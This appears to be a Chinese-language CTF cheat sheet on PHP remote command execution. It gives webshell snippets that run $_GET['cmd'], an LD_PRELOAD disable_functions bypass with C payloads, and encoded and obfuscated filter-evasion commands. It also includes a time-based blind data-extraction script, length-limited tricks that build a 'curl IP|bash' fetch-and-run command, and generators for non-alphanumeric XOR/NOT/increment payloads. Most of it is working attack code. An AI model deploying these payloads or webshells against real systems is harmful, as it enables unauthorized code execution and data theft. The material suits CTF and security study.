# PHP 命令执行

## 执行 PHP 代码函数

- `eval(phpcode)`: 反序列化中无法使用，因为 php eval 是一个语言结构，和 echo 一样不属于函数，同理就算通过配置 disable_functions 也是禁用不了 eval 函数的

- `assert(phpcode)`: php7 以前，因为 php7 中禁止了动态调用 assert。直接将传入的参数当成 PHP 代码执行，不需要以分号结尾（特别注意），有时加上分号不会显示结果

- `call_user_func("assert",phpcode)`：传入的参数作为 assert 函数的参数

## 执行系统命令函数

### system()

`system(string $command, int &$return_var): string`

command: 要执行的命令

- 有回显

### exec()

`exec(string $command, array &$output = null, int &$return_var = null): string`

command: 要执行的命令

output: 命令执行后的输出，每行一个元素，如果不设置，默认输出最后一行

可以用 print_r() 打印数组

### passthru()

`passthru(string $command, int &$return_var): void`

command: 要执行的命令

输出二进制数据，需要直接传输到浏览器

### shell_exec()

`shell_exec(string $cmd): string`

- 无回显，借助 echo、print 等函数输出： echo shell_exec('ls');

### ` 反引号

`command`: 要执行的命令

- 无回显，借助 echo、print 等函数输出： echo `ls`;

### popen()

`popen(string $command, string $mode): resource`

command: 要执行的命令

mode: 打开文件的模式，r 或 w

使用 fgets() 或 fread() 读取文件内容，再用 echo、print_r() 打印

```php
<?php
$cmd = $_GET['cmd'];
$fp = popen($cmd, 'r');
while ($s=fgets($fp)) {
    echo $s;
}
```

### proc_open()

`proc_open(string $cmd, array $descriptorspec, array &$pipes, ?string $cwd = null, ?array $env = null, ?array $other_options = null): resource`

cmd: 要执行的命令

descritorspec: 数组，指定要打开的文件描述符，0=>标准输入，1=>标准输出，2=>标准错误

pipes: 数组，存储打开的文件描述符

```php
$cmd = $_GET['cmd'];
$descriptorspec = array(
    0 => array('pipe', 'r'),
    1 => array('pipe', 'w'),
    2 => array('file', '/tmp/error-output.txt', 'a')
);

$pipes = array();
$process = proc_open($cmd, $descriptorspec, $pipes);
echo stream_get_contents($pipes[1]);
fclose($pipes[1]);
proc_close($process);
```

### pcntl_exec()

`pcntl_exec(string $path, array $args = [], array $envs = []): void`

path: 必须是可执行文件的绝对路径或一个在第一行指定了一个可执行解释器的脚本（如#!/usr/bin/env php）。

args: 数组，参数列表

envs: 数组，环境变量

```php
<?php
$cmd = $_GET['cmd'];
pcntl_exec('/bin/sh', ['-c', $cmd], []);
```

## LD_PRELOAD 绕过

### 程序的链接

- 静态链接：在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。
- 装入时动态链接：源程序编译后所得到的一组目标模块，在装入内存时，边装入边链接。
- 运行时动态链接：原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接。

对于动态链接来说，需要一个动态链接库，其作用在于当动态库中的函数发生变化对于可执行程序来说时透明的，可执行程序无需重新编译，方便程序的发布/维护/更新。

### LD_PRELOAD

LD_PRELOAD 是一个环境变量，它指定了在程序运行前要加载的动态链接库。

LD_PRELOAD 可以用来劫持系统调用，从而实现对程序的控制。

### 绕过条件

- 能上传自己的。so 文件
- 能控制环境变量（如 LD_PRELOAD) 的值，比如 putenv() 函数且未被禁止
- 存在可以控制 PHP 启动外部程序的函数并能执行，比如 mail()、imap_mail()、mb_send_mail()、error_log() 等

### 可利用函数

#### mail（内置函数）

mail 函数->调用/user/bin/sendmail->调用动态链接库 geteuid 函数

给 geteuid 重新赋值

```c
#include <stdio.h>
#include <string.h>
void payload() {
    system("echo success");
    // system("cat /flag > /tmp/flag");
}
int geteuid() {
    unsetenv("LD_PRELOAD");
    payload();
}
```

编译为`1.so`文件

上传一个`1.php`

```php
<?php
putenv("LD_PRELOAD=./1.so");
mail("", "", "", "");
?>
```

上传并访问`1.php`即可执行

##### 把要执行的命令赋值到环境变量直接读取命令

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int geteuid() {
    const char *cmd = getenv("cmd");
    if(getenv("LD_PRELOAD") == NULL) {
        return 0;
    }
    unsetenv("LD_PRELOAD");
    system(cmd);
}
```

编译为`2.so`文件

上传一个`2.php`

```php
<?php
putenv("LD_PRELOAD=./2.so");
$out_path = './out.txt';
$cmd = $_REQUEST['cmd'];
$evil_cmd = $cmd.' > '.$out_path.' 2>&1';
echo $evil_cmd;
putenv("cmd=$cmd");
mail("", "", "", "");
echo file_get_contents($out_path);
?>
```

#### imagick（扩展）

### 蚁剑绕过

加载插件->辅助工具->绕过 disable_functions

## 操作系统连接符

### Linux

- `;`：多命令顺序执行

- `&`：多命令顺序执行

- `&&`：多命令逻辑与，前面的命令执行成功才执行后面的命令

- `|`：管道输出符，将前面的命令的输出作为后面的命令的输入，把前面命令的结果当成后面命令的参数。会执行，但是只会输出最后一个命令的结果

  - 例：`echo "ls -l" | /bin/bash`

- `||`：多命令逻辑或，前面的命令执行失败才执行后面的命令

- `%0a`：换行

### Windows

除`;`外，其他符号都可以使用

## 空格过滤绕过

### $IFS 代替空格（内部字段分隔符）

- `cat /flag` -> `cat${IFS}/flag`

- `cat /flag` -> `cat$IFS/flag`

- `cat /flag` -> `cat$IFS$9/flag`

### 大括号

- `cat /flag` -> `{cat,/flag}`

- `cat /flag` -> `cat$'\x20'/flag`

### 重定向字符

- `cat</flag`

### %09（Tab）

- `cat /flag` -> `cat%09/flag`

## 文件名过滤绕过

### 通配符

- `cat /flag` -> `cat /fla?`

- `cat /flag` -> `cat /fla*`

- `cat /flag` -> `cat /fla[g]`

### 单双引号绕过

- `cat /flag` -> `cat /f""lag`

- `cat /flag` -> `cat /f''lag`

### 反斜杠绕过

反斜杠把特殊字符去掉功能性，单纯表示为字符串

- `cat /flag` -> `cat /fla\g`

### 特殊变量

$1 到$9、$@、$\*

- `cat /flag` -> `cat /f$1la$9g`

- `cat /flag` -> `cat /f$*\lag`

### 内联执行（$拼接）

- `cat /flag` -> `a=f;cat $alag`

### 利用 linux 中的环境变量

```sh
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

- `cat /flag` -> `cat ${PATH:0:1}f${PATH:5:1}ag`

## 常见文件读取命令绕过

- `cat`

- `tac`: 从最后一行开始显示，可以看出`tac`是`cat`的倒着写

- `nl`: 显示的时候，顺便输出行号

- `more`: 一页一页的显示文件内容

- `less`: 与`more`类似，但是比`more`更好的是，他可以往前翻页

- `head`: 只看头几行

- `tail`: 只看尾巴几行

- `od`: 以二进制的方式读取文件（转换成字符：`od -A d -c /flag`）

- `strings`: 以字符串的方式读取文件

- `xxd`: 以 16 进制的方式读取文件

- `iconv`: 转换文件编码

- `base64`: 以 base64 的方式读取文件（还有`base32`、`base58`）

- `sort`: 排序

- `uniq`: 去重

- `file -f`: 识别文件类型，-f 参数表示识别文件中表示的文件路径，报错就可以显示出文件内容（no such file or directory）

- `grep`: 用法：`grep { /flag`，表示在`flag`文件中查找`{`字符串

## 编码绕过

### base64

- `cat /flag` -> `echo Y2F0IC9mbGFn | base64 -d | sh`

- `cat /flag` -> \`echo Y2F0IC9mbGFn | base64 -d\` （Linux 中反引号表示执行命令）

- `cat /flag` -> `$(echo Y2F0IC9mbGFn | base64 -d)`

- `cat /flag` -> `printf "Y2F0IC9mbGFn" | base64 -d | sh`

### base32

- `cat /flag` -> `echo MNQXIIBPMZWGCZY= | base32 -d | sh`

### base58

- `cat /flag` -> `echo 2GNQyDr4iit1c | base58 -d | sh`

### HEX 编码

- `cat /flag` -> `echo 636174202f666c6167 | xxd -r -p | sh`

### shellcode

- `cat /flag` -> `echo -ne "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67" | sh`

- `cat /flag` -> `printf "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67" | sh`

## 无回显时间盲注

- `cat /flag` -> `if [ $(cat /flag | awk NR==1 | cut -c 1) == a ];then sleep 2;fi`
  - `awk NR==1`表示输出第一行
  - `cut -c 1`表示输出第一个字符

```python
import requests
import time

def handle_exp(exp):
    return exp

url = "http://192.168.1.1/1.php"
param = "a"
cmd = "cat /flag"
result = ""

for line in range(1, 10):
    for letter in range(1, 50):
        for acc in range(32, 126):
            exp = f"if [ $({cmd} | awk NR=={line} | cut -c {letter}) == {chr(acc)} ];then sleep 3;fi"
            # print(exp)
            try:
                res = requests.get(url + f"?{param}={handle_exp(exp)}", timeout=2)
                # data = {param: cmd}
                # res = requests.post(url=url, data=data)
            except TimeoutError:
                result += chr(acc)
                print(chr(acc))

print(result)
```

## 长度过滤绕过

### 相关命令

- `>`和`>>`：重定向符，`>`表示覆盖，`>>`表示追加

  - `> test`可以创建一个名为 test 的文件，类似 touch 命令

- `\`：换行符

- `ls -t`：按照时间排序，最新的文件在最前面。

  - 默认按照文件名 ascii 码排序
  - 注意时间只能精确到秒

- `dir`：列出文件名，好处：不换行，"d"排名靠前

  - `$(dir *)` 如果第一个文件名是命令的话就会执行命令，后面的文件名作为参数输入

- `rev`：输出文本内容但是反转每一行的字符顺序

### 组合运用

对命令长度有限制时，把一些很短的文件名拼接成可执行命令

- `>` 创建很短的文件名

- `ls -t` 按时间顺序列出文件名，按行存储

- `\` 连接换行命令

- `sh` 从文件中读取命令

第一步：创建文件

```sh
>ag
>fl\\
>"t \\"
>ca\\
```

第二步：将命令拼接到文件中

```sh
ls -t>x
```

第三步：执行命令

```sh
sh < x
# 或
sh x
# 或
. x
```

### 长度限制为 5 的绕过

#### 1. 构造 ls -t>y

```sh
>ls\\ # "ls\"
ls>_ # 将 ls\写入_文件
>\ \\ # " \"
>-t\\ # "-t\"
>\>y # ">y"
ls>>_
```

#### 2. 分解命令，创建文件

```sh
# 构造 curl 192.168.1.161|bash
>bash
>\|\\
>61\\
>1\\
>1.\\
>68\\
>2.\\
>19\\
>\ \\
>rl\\
>cu\\
```

#### 3. 执行脚本

```sh
sh _
sh y
```

### 长度限制为 4 的绕过

#### 前置知识

- `ls>>_`: 不再适用
- `*`：相当于$(dir \*)，如果第一个文件名是命令的话就会执行命令，后面的文件名作为参数输入

#### 1. 构造 ls -t>g

```sh
>g\> # "g>"
>ht- # "ht-" 使文件名排列为"g> ht- sl"
>sl # "sl"
>dir
# ls: dir 'g>' ht- sl
*>v # 执行 dir 命令，将结果写入 v 文件
# cat v: g> ht- sl
>rev
*v>x # *v 相当于 rev 命令，将结果写入 x 文件
# cat x: ls -th >g
```

#### 2.  分解命令，创建文件

```sh
# 构造 curl 192.168.1.161|bash，但是 ip 用 16 进制表示：curl 0xc0a801a1|bash，因为"."不方便处理
>ash
>b\
>\|\
>A1\
>01\
>A8\
>C0\
>0x\
>\\
>rl\
>cu\
```

#### 3.  执行脚本

```sh
sh x
sh g
```

## 无参数

```php
if(';'===preg_replace('/[^\W]+\((?R)?\)/','',$_GET['code'])){
  eval($_GET['code']);
}
```

- 如果是字母、数字、下划线+();，如 a();，则替换后为";"，判断为 true，括号内不能带内容，否则匹配不到，不能替换为空，判断为 false
- ?R 表示递归匹配，即匹配 a(b(c()));

### 常见函数解释

- `print_r(?)`: 打印变量
- `eval(string)`: 执行字符串中的 PHP 代码
- `pos(array)`: 返回数组第一个的值
- `end(array)`: 返回数组最后一个的值
- `next(array)`: 返回数组中当前指针指向的下一个元素的值，并将指针向后移动一位

- `session_start()`: 启动或重用会话，成功返回 true，失败返回 false
- `session_id(session)`: 获取会话 ID

- `show_source(file)`: 显示文件的源码

## 无参数命令执行请求头绕过

### 请求头 RCE

#### HTTP 请求标头（php7.3）

`getallheaders()`: 获取所有的 HTTP 请求标头，显示顺序是和发送的顺序相反的

`apache_request_headers()`

##### exp：利用请求头进行 RCE

抓包，在请求头中添加最后一行（或者修改最后一行）：`flag: system('cat /flag')`;

`?code=eval(pos(getallheaders()));`

#### 利用全局变量进行 RCE（php5/7）

`get_defined_vars()`: 返回所有已定义变量的数组
返回数组顺序为 GET->POST->COOKIE->SERVER->ENV->FILES->REQUEST->GLOBALS

##### exp：利用全局变量进行 RCE

`?code=eval(end(pos(get_defined_vars())));&cmd=system('id');`

`?code=eval(system(key(pos(get_defined_vars()))));&cat${IFS}/flag=1;`

#### 利用 session（php5）

##### exp1

将 PHPSESSID 改为`./flag`

`?code=show_source(session_id(session_start()));`

即可读取 flag 文件

##### exp2

使用`eval()`
PHPSESSID 改为`phpinfo();`
无法直接执行，需要先把命令转成 16 进制写入 PHPSSID
再是使用`hex2bin()`函数转换成二进制数，用 eval 执行

`?code=eval(hex2bin(session_id(session_start())));`

#### 使用 scandir() 进行文件读取

##### 函数

- `scandir(dir)`: 返回一个包含有指定路径中的文件和目录的数组
- `getcwd()`: 返回当前工作目录
- `chdir(dir)`: 改变当前工作目录
- `current(array)`: 返回数组中的当前元素的值（第一个）
- `next(array)`: 返回数组中当前指针指向的下一个元素的值，并将指针向后移动一位
- `array_reverse(array)`: 返回一个单元顺序相反的数组
- `array_flip(array)`: 交换数组中的键和值
- `array_rand(array)`: 从数组中随机取出一个或多个单元
- `strrev(string)`: 反转字符串
- `crypt(string)`: 单向加密字符串
- `hebrevc(string)`: 将希伯来文本从右往左转换为从左往右
- `localeconv()`: 可以输出一个第一项为"."的数组
- `dirname(path)`: 返回路径中的目录部分（去掉路径中的最后一个文件名或目录）

##### exp：使用 localeconv()（.）读取当前目录的文件

列出当前目录下的文件

`?code=print_r(scandir(current(localeconv())));`

假设目录结构如下：

```txt
.
..
1.php
flag.php
```

反转目录

`?code=print_r(array_reverse(scandir(current(localeconv()))));`

读取目录的最后一个（反转后的第一个）

`?code=show_source(current(array_reverse(scandir(current(localeconv())))));`

##### exp：使用 getcwd() 读取本级或上级目录的文件

列出当前目录下的文件

`?code=print_r(scandir(getcwd()));`

列出上级目录下的文件

`?code=print_r(scandir(dirname(getcwd())));`

读取上级目录的最后一个

`?code=show_source(current(array_reverse(scandir(chdir(dirname(getcwd()))))));`

随机读取上级目录任意文件（array_flip）

`?code=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));`
👇
getcwd() 获取当前工作目录。
dirname(getcwd()) 获取当前工作目录的父目录。
chdir(dirname(getcwd())) 将当前工作目录更改为其父目录。
scandir(dirname(chdir(dirname(getcwd())))) 读取新的工作目录（即原来的父目录）下的所有文件和目录。
array_flip(scandir(dirname(chdir(dirname(getcwd()))))) 将文件和目录的数组反转，使得文件和目录名成为数组的键。
array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))) 从键（即文件和目录名）中随机选择一个。
show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))) 显示所选文件的源代码。

`?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));`
👇
getcwd() 获取当前工作目录。
scandir(getcwd()) 读取当前工作目录下的所有文件和目录。
next(scandir(getcwd())) 获取当前工作目录下的下一个文件或目录。
chdir(next(scandir(getcwd()))) 将当前工作目录更改为下一个文件或目录。
crypt(chdir(next(scandir(getcwd())))) 对新的工作目录进行哈希加密。
hebrevc(crypt(chdir(next(scandir(getcwd()))))) 将加密后的字符串进行反转。
ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))) 获取反转后的字符串的第一个字符的 ASCII 值。
chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd()))))))) 将 ASCII 值转换回字符。
scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))) 读取由 ASCII 值表示的目录下的所有文件和目录。
array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd()))))))))) 将文件和目录的数组反转，使得文件和目录名成为数组的键。
array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))) 从键（即文件和目录名）中随机选择一个。
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd()))))))))))) 显示所选文件的源代码。

`?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));`

phpversion() 获取当前 PHP 的版本号。
crypt(phpversion()) 对 PHP 版本号进行哈希加密。
hebrevc(crypt(phpversion())) 将加密后的字符串进行反转。
ord(hebrevc(crypt(phpversion()))) 获取反转后的字符串的第一个字符的 ASCII 值。
chr(ord(hebrevc(crypt(phpversion())))) 将 ASCII 值转换回字符。
scandir(chr(ord(hebrevc(crypt(phpversion()))))) 试图读取由 ASCII 值表示的目录下的所有文件和目录。
next(scandir(chr(ord(hebrevc(crypt(phpversion())))))) 获取当前工作目录下的下一个文件或目录。
chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))) 将当前工作目录更改为下一个文件或目录。
crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))) 对新的工作目录进行哈希加密。
hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))) 将加密后的字符串进行反转。
ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))) 获取反转后的字符串的第一个字符的 ASCII 值。
chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))) 将 ASCII 值转换回字符。
scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))) 读取由 ASCII 值表示的目录下的所有文件和目录。
array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))) 将文件和目录的数组反转，使得文件和目录名成为数组的键。
array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))) 从键（即文件和目录名）中随机选择一个。
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))))) 显示所选文件的源代码。

##### exp：使用 array() 读取根目录

`?code=print_r(serialize(array()));`
👇
a:0:{}

`?code=print_r(crypt(serialize(array())));`
随机加密，有几率结尾会有"/"👇
$1$kQp4VPZo$.cwWophFa8mHwHf4etyWP/

将结果反转
`?code=print_r(strrev(crypt(serialize(array()))));`
👇
/n9RZqndDIdPVfDBo62HOT$EiorHvqj$1$

取第一位（利用 ord() 只能取第一位的特性）
`?code=print_r(chr(ord(strrev(crypt(serialize(array()))))));`
👇
/

列出根目录下的文件
`?code=print_r(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array())))))))));`

随机读取某个文件
`?code=show_source(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array())))))))))));`

## 无字母数字绕过

```php
<?
if(!preg_match('/[a-z0-9]/is',$_GET['code'])){
  eval($_GET['code']);
}
```

### 异或运算绕过

```php
// 生成所有可见字符的异或构造结果
<?php

/*author yu22x*/

$myfile = fopen("xor_rce.txt", "w");
$contents = "";
for ($i = 0; $i < 256; $i++) {
    for ($j = 0; $j < 256; $j++) {

        if ($i < 16) {
            $hex_i = '0' . dechex($i);
        } else {
            $hex_i = dechex($i);
        }
        if ($j < 16) {
            $hex_j = '0' . dechex($j);
        } else {
            $hex_j = dechex($j);
        }
        $preg = '/[a-z0-9]/i'; //根据题目给的正则表达式修改即可
        if (preg_match($preg, hex2bin($hex_i)) || preg_match($preg, hex2bin($hex_j))) {
            echo "";
        } else {
            $a = '%' . $hex_i;
            $b = '%' . $hex_j;
            $c = (urldecode($a) ^ urldecode($b));
            if (ord($c) >= 32 & ord($c) <= 126) {
                $contents = $contents . $c . " " . $a . " " . $b . "\n";
            }
        }

    }
}
fwrite($myfile, $contents);
fclose($myfile);
```

```python
# 构造 payload
# -*- coding: utf-8 -*-

# author yu22x

import requests
import urllib
from sys import *
import os

def action(arg):
    s1 = ""
    s2 = ""
    for i in arg:
        f = open("xor_rce.txt", "r")
        while True:
            t = f.readline()
            if t == "":
                break
            if t[0] == i:
                # print(i)
                s1 += t[2:5]
                s2 += t[6:9]
                break
        f.close()
    output = '("' + s1 + '"^"' + s2 + '")'
    return output

while True:
    param = (
        action(input("\n[+] your function：")) + action(input("[+] your command：")) + ";"
    )
    print(param)
```

```sh
# 运行结果
[+] your function：system
[+] your command：ls
("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60")("%0c%08"^"%60%7b");
```

### 或运算绕过

```php
<?php
// 生成或构造结果
/* author yu22x */

$myfile = fopen("or_rce.txt", "w");
$contents = "";
for ($i = 0; $i < 256; $i++) {
  for ($j = 0; $j < 256; $j++) {

    if ($i < 16) {
      $hex_i = '0' . dechex($i);
    } else {
      $hex_i = dechex($i);
    }
    if ($j < 16) {
      $hex_j = '0' . dechex($j);
    } else {
      $hex_j = dechex($j);
    }
    $preg = '/[0-9a-z]/i'; //根据题目给的正则表达式修改即可
    if (preg_match($preg, hex2bin($hex_i)) || preg_match($preg, hex2bin($hex_j))) {
      echo "";
    } else {
      $a = '%' . $hex_i;
      $b = '%' . $hex_j;
      $c = (urldecode($a) | urldecode($b));
      if (ord($c) >= 32 & ord($c) <= 126) {
        $contents = $contents . $c . " " . $a . " " . $b . "\n";
      }
    }

  }
}
fwrite($myfile, $contents);
fclose($myfile);
```

```python
# 构造 payload
# -*- coding: utf-8 -*-

# author yu22x

import requests
import urllib
from sys import *
import os
def action(arg):
   s1=""
   s2=""
   for i in arg:
       f=open("or_rce.txt","r")
       while True:
           t=f.readline()
           if t=="":
               break
           if t[0]==i:
               #print(i)
               s1+=t[2:5]
               s2+=t[6:9]
               break
       f.close()
   output="(\""+s1+"\"|\""+s2+"\")"
   return(output)
   
while True:
   param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"
   print(param)
```

```sh
# 运行结果
[+] your function：system
[+] your command：ls
("%13%19%13%14%05%0d"|"%60%60%60%60%60%60")("%0c%13"|"%60%60");
```

### 取反绕过

```php
<?php
//在命令行中运行

/*author yu22x*/

fwrite(STDOUT, '[+]your function: ');

$system = str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN));

fwrite(STDOUT, '[+]your command: ');

$command = str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN));

echo '[*] (~' . urlencode(~$system) . ')(~' . urlencode(~$command) . ');';
```

```sh
# 运行结果
[+]your function: system
[+]your command: ls
[*] (~%8C%86%8C%8B%9A%92)(~%93%8C);
```

### 自增绕过

```php
//测试发现 7.0.12 以上版本不可使用
//使用时需要 url 编码下
$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
固定格式 构造出来的 assert($_POST[_]);
然后 post 传入   _=phpinfo();
```

### 上传临时文件绕过

题目代码

```php
<?php
if(isset($_GET['code'])){
    $code = $_GET['code'];
    if(strlen($code)>35){ //长度不能超过 35
        die("Long.");
    }
    if(preg_match("/[A-Za-z0-9_$]+/",$code)){ //不能包含下划线和$
        die("NO.");
    }
    eval($code);
}else{
    highlight_file(__FILE__);
}
```

exp

```python
#coding:utf-8
#author yu22x
import requests
url="http://xxx/test.php?code=?><?=`. /???/????????[@-[]`;?>"
files={'file':'cat f*'}
response=requests.post(url,files=files)
html = response.text
print(html)
```
